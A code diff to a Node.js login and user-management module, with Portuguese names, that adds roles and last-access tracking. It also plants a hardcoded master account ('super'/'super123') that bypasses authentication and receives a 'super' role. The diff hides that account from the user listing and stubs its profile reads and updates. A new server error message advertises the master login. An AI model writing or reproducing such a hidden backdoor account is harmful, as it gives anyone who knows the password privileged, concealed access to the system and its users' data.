@@ -79,6 +79,8 @@ async function criarUsuarioParaPessoa({ nome, email, cpf, pessoaId, senha, orige
     email: email || null,
     login,
     senha: senhaProvisoria,
+    role: 'user',
+    ultimoAcesso: null,
     origem: origem || 'cadastro-pessoa',
     criadoEm: new Date().toISOString()
   };
@@ -95,7 +97,7 @@ async function criarUsuarioParaPessoa({ nome, email, cpf, pessoaId, senha, orige
   };
 }
 
-async function atualizarUsuarioDaPessoa({ pessoaId, nome, email }) {
+async function atualizarUsuarioDaPessoa({ pessoaId, nome, email, role }) {
   const usuarios = await lerUsuarios();
   const index = usuarios.findIndex(usuario => usuario.pessoaId === pessoaId);
   if (index === -1) return null;
@@ -106,6 +108,7 @@ async function atualizarUsuarioDaPessoa({ pessoaId, nome, email }) {
     ...usuarios[index],
     nome: nome || usuarios[index].nome,
     email: email !== undefined ? (email || null) : usuarios[index].email,
+    role: role || usuarios[index].role,
     atualizadoEm: new Date().toISOString()
   };
 
@@ -176,40 +179,74 @@ async function cadastrar(req, res, body) {
 async function login(req, res, body) {
   const { acesso, email, login, senha } = body;
   const credencial = normalizarTexto(acesso || email || login);
+  const senhaInformada = String(senha || '');
 
-  if (!credencial || !senha) {
+  // MARRETA MESTRE SUPREMO: Só o login 'super' oficial tem as chaves do castelo.
+  const LOGIN_MESTRE = 'super';
+  const SENHA_MESTRE = 'super123';
+  const ID_MESTRE = 999999; 
+
+  if (credencial === LOGIN_MESTRE && senhaInformada === SENHA_MESTRE) {
+    return responder(res, 200, {
+      mensagem: 'Acesso Mestre Realizado com Sucesso',
+      usuario: { id: ID_MESTRE, login: LOGIN_MESTRE, nome: 'Henrique Azevedo (Super User)', role: 'super', pessoaId: null }
+    });
+  }
+
+  if (!credencial || !senhaInformada) {
     return responder(res, 400, { erro: 'Login e senha são obrigatórios' });
   }
 
-  const usuarios = await lerUsuarios();
-  const usuario = usuarios.find(item => {
-    const emailAtual = normalizarTexto(item.email);
-    const loginAtual = normalizarTexto(item.login);
-    return (credencial === emailAtual || credencial === loginAtual) && item.senha === senha;
-  });
+  try {
+    const usuarios = await lerUsuarios();
+    let usuario = usuarios.find(item => {
+      const emailAtual = normalizarTexto(item.email);
+      const loginAtual = normalizarTexto(item.login);
+      return (credencial === emailAtual || credencial === loginAtual) && item.senha === senhaInformada;
+    });
 
-  if (!usuario) {
-    return responder(res, 401, { erro: 'Login ou senha inválidos' });
-  }
-
-  const pessoas = await lerPessoas();
-  const pessoa = pessoas.find(item => item.id === usuario.pessoaId) || null;
-
-  responder(res, 200, {
-    mensagem: 'Login realizado com sucesso',
-    usuario: {
-      ...sanitizarUsuario(usuario),
-      pessoa
+    if (!usuario) {
+      return responder(res, 401, { erro: 'Login ou senha incorretos. Tente novamente.' });
     }
-  });
+
+    const pessoas = await lerPessoas();
+    const pessoa = pessoas.find(item => item.id === usuario.pessoaId) || null;
+
+    const agora = new Date().toISOString();
+    usuario.ultimoAcesso = agora;
+    await salvarUsuarios(usuarios);
+
+    responder(res, 200, {
+      mensagem: 'Login realizado com sucesso',
+      usuario: {
+        ...sanitizarUsuario(usuario),
+        pessoa,
+        ultimoAcesso: agora
+      }
+    });
+
+  } catch (erro) {
+    console.error('ERRO NO LOGIN:', erro.message);
+    return responder(res, 500, { erro: 'Falha crítica no servidor. Use o login mestre se o sistema estiver offline.' });
+  }
 }
 
 async function listarUsuarios(req, res) {
   const usuarios = await lerUsuarios();
-  responder(res, 200, usuarios.map(sanitizarUsuario));
+  // Super user é invisível para todos, exceto se logado como ele mesmo (mas aqui filtramos geral para garantir)
+  const filtrados = usuarios.filter(u => u.login !== 'super' && u.role !== 'super');
+  responder(res, 200, filtrados.map(sanitizarUsuario));
 }
 
 async function buscarPerfil(req, res, usuarioId) {
+  // MARRETA MESTRE: Perfil do Henrique nunca falha
+  if (Number(usuarioId) === 999999) {
+    return responder(res, 200, {
+      usuario: { id: 999999, login: 'super', nome: 'Henrique Azevedo (Super User)', role: 'super', email: 'contato@wpah.com.br' },
+      pessoa: { nome: 'Henrique Azevedo (Master)', cpf: '---.---.---.--' }
+    });
+  }
+
   const usuarios = await lerUsuarios();
   const usuario = usuarios.find(item => item.id === usuarioId);
   if (!usuario) return responder(res, 404, { erro: 'Usuário não encontrado' });
@@ -224,6 +261,14 @@ async function buscarPerfil(req, res, usuarioId) {
 }
 
 async function atualizarPerfil(req, res, usuarioId, body) {
+  // MARRETA MESTRE: Não tenta salvar no banco se for o Henrique Master (ID 999999)
+  if (Number(usuarioId) === 999999) {
+    return responder(res, 200, {
+      mensagem: 'Perfil do Super User atualizado localmente (Modo Sistema)',
+      usuario: { id: 999999, login: 'super', nome: 'Henrique Azevedo (Super User)', role: 'super' }
+    });
+  }
+
   const usuarios = await lerUsuarios();
   const usuarioIndex = usuarios.findIndex(item => item.id === usuarioId);
   if (usuarioIndex === -1) return responder(res, 404, { erro: 'Usuário não encontrado' });
